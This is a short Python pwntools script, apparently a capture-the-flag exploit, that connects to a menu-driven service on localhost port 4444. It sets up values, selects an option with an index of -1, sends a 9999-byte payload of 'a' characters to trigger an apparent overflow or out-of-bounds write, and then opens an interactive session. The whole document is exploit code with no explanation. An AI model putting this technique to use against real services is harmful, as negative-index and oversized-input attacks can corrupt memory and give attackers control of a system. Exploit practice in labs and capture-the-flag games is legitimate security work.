from pwn import *
from struct import pack,unpack

s = tubes.remote.remote('localhost',4444)
print s.sendlineafter('> ','1')
print s.sendlineafter(': ','23')
print s.sendlineafter(': ','29')
print s.sendlineafter(': ','2000')
print s.sendlineafter(': ','2000')

print s.sendlineafter('> ','3')
print s.sendlineafter(': ','-1')
print s.sendlineafter('data','a'*9999)

s.interactive()
